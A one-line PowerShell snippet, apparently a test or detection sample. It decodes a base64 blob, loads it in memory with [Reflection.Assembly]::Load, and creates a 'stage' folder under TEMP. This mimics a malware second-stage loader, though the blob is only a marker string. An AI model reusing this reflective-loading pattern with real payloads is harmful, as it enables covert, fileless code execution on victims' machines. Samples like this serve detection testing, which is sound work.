$StageBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpoYnczMnNuaG5x'); [Reflection.Assembly]::Load($StageBytes); $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
